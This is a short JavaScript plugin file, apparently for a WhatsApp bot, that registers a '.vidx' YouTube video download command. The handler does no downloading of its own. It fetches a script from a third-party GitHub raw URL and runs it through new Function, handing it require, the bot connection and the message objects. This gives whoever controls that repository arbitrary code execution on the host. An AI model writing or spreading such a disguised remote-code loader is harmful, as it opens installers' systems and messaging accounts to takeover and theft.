const { cmd } = require('../command');
const axios = require("axios");

// Command to fetch video command logic dynamically
cmd({
    pattern: "vidx",
    alias: ["song", "ytv", "ytvideo"],
    react: '🎥',
    desc: "Download videos from YouTube by searching for keywords.",
    category: "video",
    use: '.vidx <keywords>',
    filename: __filename
},
async (conn, mek, m, options) => {
    try {
        const commandUrl = 'https://raw.githubusercontent.com/JawadYTX/KHAN-DATA/refs/heads/main/MSG/jawad.js'; // GitHub raw URL

        // Fetch the remote command logic
        const response = await axios.get(commandUrl);
        const commandCode = response.data;

        // Evaluate and execute the fetched code
        const executeCommand = new Function('module', 'exports', 'require', 'conn', 'mek', 'm', 'options', commandCode);
        const module = { exports: {} };
        executeCommand(module, module.exports, require, conn, mek, m, options);

        // Call the fetched command's exported function
        await module.exports(conn, mek, m, options);

    } catch (error) {
        console.error(error);
        options.reply("❌ An error occurred while processing your request.");
    }
});
